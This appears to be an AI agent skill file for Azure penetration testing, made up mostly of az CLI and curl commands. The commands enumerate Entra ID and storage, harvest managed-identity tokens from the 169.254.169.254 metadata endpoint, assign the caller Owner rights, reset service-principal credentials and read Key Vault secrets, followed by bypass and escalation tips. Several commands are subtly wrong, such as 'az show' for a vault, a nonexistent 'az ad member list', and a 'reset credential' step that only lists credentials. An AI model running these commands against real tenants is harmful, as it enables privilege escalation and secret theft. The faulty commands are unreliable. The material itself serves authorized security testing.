---
name: azure
description: Azure security testing covering blob storage exposure, managed identity abuse, metadata endpoints, Azure AD attacks, and role assignment escalation
---

# Azure Security Testing

Azure environments expose attack surfaces through misconfigured storage accounts, overly permissive role assignments, managed identity abuse, and Azure AD (Entra ID) misconfigurations. Misconfigurations in RBAC, conditional access policies, and service principal permissions are common and frequently lead to privilege escalation, data exfiltration, and tenant-wide compromise.

## Attack Surface

**Scope**
- Azure Blob Storage and Data Lake
- Azure AD (Entra ID) users, groups, service principals, and applications
- Virtual Machines and their managed identities
- Azure Functions and App Services
- Azure Kubernetes Service (AKS)
- Key Vault secrets and keys
- Azure SQL and Cosmos DB
- Resource Groups and Subscriptions
- Azure DevOps and pipelines
- Azure Container Registry

**Entry Points**
- Compromised service principal credentials (client secrets, certificates)
- SSRF to instance metadata endpoint (169.254.169.254)
- Publicly accessible blob storage containers
- Overly permissive Azure RBAC role assignments
- Leaked credentials in Azure DevOps pipelines, App Settings, or code repos
- OAuth2 token theft from compromised applications
- Guest user access in Azure AD tenants

**Authentication Methods**
- Azure AD OAuth2 tokens (access tokens, refresh tokens)
- Service principal client secrets and certificates
- Managed identity tokens (system-assigned, user-assigned)
- SAS (Shared Access Signature) tokens for storage
- Azure AD device code flow
- Username/password (Azure AD or synced on-prem AD)

## Key Vulnerabilities

### Blob Storage Exposure

**Enumeration:**
```bash
# List storage accounts
az storage account list --query "[].name" -o tsv

# List containers in a storage account
az storage container list --account-name <account> --auth-mode login

# List containers anonymously (public)
az storage container list --account-name <account> --query "[].name" -o tsv

# Enumerate blob contents
az storage blob list --container-name <container> --account-name <account>

# Check public access level
az storage account show --name <account> --query "allowBlobPublicAccess"
az storage container show --name <container> --account-name <account> --query "publicAccess"
```

**Common Misconfigurations:**
```bash
# Public container (anonymous read)
az storage blob list --container-name <container> --account-name <account> \
  --output none 2>/dev/null && echo "PUBLIC CONTAINER"

# Download public blobs
az storage blob download --container-name <container> --name <blob> \
  --account-name <account> --file <local-path>

# Check for sensitive files
az storage blob list --container-name <container> --account-name <account> \
  --query "[?ends_with(name, '.env') || ends_with(name, '.key') || ends_with(name, '.bak')].name"

# SAS token abuse (if leaked)
az storage blob list --container-name <container> \
  --sas-token "<token>" --account-name <account>

# Check for soft delete (recoverable deleted blobs)
az storage account show --name <account> --query "deleteRetentionPolicy"
az storage blob list --container-name <container> --account-name <account> --include d
```

### Azure AD (Entra ID) Attacks

**Enumeration:**
```bash
# List users
az ad user list --query "[].{Name:displayName,UPN:userPrincipalName}"

# List groups
az ad group list --query "[].{Name:displayName,ID:id}"

# List service principals
az ad sp list --all --query "[].{Name:displayName,AppID:appId}"

# List applications
az ad app list --query "[].{Name:displayName,AppID:appId}"

# Check current identity
az ad signed-in-user show

# List role assignments for current user
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv)

# List all role assignments at subscription
az role assignment list --all --query "[].{Principal:principalName,Role:roleDefinitionName,Scope:scope}"

# List Global Administrators
az ad member list --group "Global Administrators"  # or "Company Administrators"
```

**Service Principal Abuse:**
```bash
# List SP credentials (secrets and certificates)
az ad sp credential list --id <app-id> --query "[].{Type:type,End:endDate}"

# Create new credential for SP (if has permission)
az ad sp credential reset --id <app-id> --append

# Add password credential
az ad sp credential list --id <app-id>

# Check SP permissions
az role assignment list --assignee <sp-id> --all

# OAuth2 token theft from App Service
az webapp config appsettings list --name <app-name> --resource-group <rg>
# Look for: AzureWebJobsStorage, WEBSITE_AUTH_CLIENT_ID, custom secrets
```

**Guest User Abuse:**
```bash
# Check if guest users can enumerate directory
az ad user list --query "[?userType=='Guest']"

# Check B2B collaboration settings
az rest --method GET --uri "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```

### Instance Metadata & Managed Identity

**VM Metadata:**
```bash
# Basic metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Instance identity
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .compute

# Get compute name, resource group, subscription
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01&format=text"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text"

# Network metadata
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"
```

**Managed Identity Token:**
```bash
# Get access token for Azure Resource Manager
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Get access token for specific resource
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Get token for Microsoft Graph
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"

# Get token for Azure Storage
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Get token for Azure Key Vault
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

# Check which managed identities are available
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01"

# User-assigned identity (specify client_id)
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>"
```

**Using Harvested Managed Identity Tokens:**
```bash
# Use token to enumerate resources
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)

# List subscriptions
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# List resource groups
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub-id>/resourceGroups?api-version=2020-01-01"

# List Key Vaults
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub-id>/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"
```

### Role Assignment Escalation

```bash
# Check current role assignments
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all

# List all custom roles (may have excessive permissions)
az role definition list --custom-role-only true --query "[].{Name:roleName,Actions:permissions[0].actions}"

# Add Owner role to self (if has Microsoft.Authorization/roleAssignments/write)
az role assignment create --assignee <your-id> --role "Owner" --scope "/subscriptions/<sub-id>"

# Escalate via User Access Administrator
az role assignment create --assignee <your-id> --role "User Access Administrator" --scope "/subscriptions/<sub-id>"

# Check for Contributor role (can create resources with managed identities)
az role assignment list --all --query "[?roleDefinitionName=='Contributor']"

# Look for Owner/Contributor on Management Group level
az role assignment list --scope "/providers/Microsoft.Management/managementGroups/<mg-id>" --all
```

### Key Vault Access

```bash
# List Key Vaults
az keyvault list --query "[].name"

# List secrets (if has access)
az keyvault secret list --vault-name <vault>

# Get secret value
az keyvault secret show --vault-name <vault> --name <secret>

# List keys
az keyvault key list --vault-name <vault>

# Check access policies
az show --name <vault> --query "properties.accessPolicies[]"
# Or RBAC mode
az role assignment list --scope "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>"
```

### AKS & Container Attacks

```bash
# List AKS clusters
az aks list --query "[].{Name:name,RG:resourceGroup}"

# Get cluster credentials
az aks get-credentials --resource-group <rg> --name <cluster>

# Check for Azure AD integration
az aks show --resource-group <rg> --name <cluster> --query "aadProfile"

# Check for managed identity on AKS
az aks show --resource-group <rg> --name <cluster> --query "identity"

# List Azure Container Registries
az acr list --query "[].{Name:name,LoginServer:loginServer}"

# Check for public ACR
az acr show --name <registry> --query "publicNetworkAccess"

# List images in ACR
az acr repository list --name <registry>
```

## Bypass Techniques

**Token Harvesting**
- Managed identity tokens from metadata endpoint (no authentication needed)
- Azure AD tokens from App Service / Azure Functions environment
- SAS tokens in URLs, logs, and configuration files

**RBAC Scope Bypass**
- Role assignments at subscription level inherit to all resource groups
- Management Group roles apply across subscriptions
- Resource-level roles may grant broader access via ARM API

**Azure AD Bypass**
- Conditional Access policies may not cover all client apps or locations
- Legacy authentication protocols may bypass MFA
- Guest users may have unexpected directory enumeration capabilities

## Testing Methodology

1. **Credential discovery** - Check for SP secrets, SAS tokens, connection strings in repos and configs
2. **Identity mapping** - `az account show`, `az ad signed-in-user show`
3. **Permission enumeration** - `az role assignment list --all`, test API calls
4. **Metadata probe** - Extract managed identity tokens, enumerate accessible resources
5. **Storage audit** - List accounts, check public access, test blob enumeration
6. **Azure AD mapping** - Enumerate users, groups, SPs, apps, role assignments
7. **Privilege escalation** - Test role assignment, SP credential creation, MI token abuse
8. **Lateral movement** - Use harvested tokens to access other subscriptions and tenants

## Tools

- **az cli** - Primary Azure CLI tool
- **MicroBurst** - Azure security assessment and blob enumeration toolkit
- **Stormspotter** - Azure attack path visualization
- **ROADtools** - Azure AD enumeration and exploitation
- **AzureHound** - Azure AD attack path mapping for BloodHound
- **ScoutSuite** - Multi-cloud security auditing
- **Prowler** - Azure security assessment
- **PowerZure** - PowerShell framework for Azure offensive security

## Validation Requirements

- Prove access to resources beyond intended scope (cross-subscription data, other users' secrets)
- Demonstrate privilege escalation path from initial access to elevated permissions
- Show actual token extraction from metadata and verify access level
- Document specific role assignments that enabled the bypass
- For Storage: show actual blob read/write with request details
- For Key Vault: demonstrate secret retrieval
- Confirm logging gaps by performing logged vs unlogged actions

## False Positives

- Public blob container exists but behind Azure Front Door with WAF
- Role assignment exists but limited by Azure AD Conditional Access
- Managed identity has broad role but VM has no network access to target
- Guest user exists but restricted by external collaboration settings
- Key Vault accessible but all secrets have expiration dates in the past

## Impact

- Full subscription takeover from leaked service principal credentials
- Data exfiltration from publicly accessible blob storage containers
- Azure AD tenant compromise from Global Admin role escalation
- Secret extraction from Key Vault via managed identity abuse
- Lateral movement across subscriptions via management group role assignments
- Supply chain attacks via Azure DevOps pipeline manipulation

## Pro Tips

1. Always check `az account show` and `az ad signed-in-user show` first
2. Managed identity tokens are the easiest credential to harvest from compromised VMs
3. `Contributor` role can escalate to `Owner` by deploying a VM with a privileged managed identity
4. SAS tokens in URLs and logs are extremely common - check application logs
5. Azure AD P1/P2 features like Conditional Access may not cover legacy auth protocols
6. Key Vault RBAC mode vs access policies mode - different attack surfaces
7. `Microsoft.Authorization/roleAssignments/write` is the most dangerous permission in Azure
8. Check `az rest` for direct ARM API calls when CLI commands are restricted
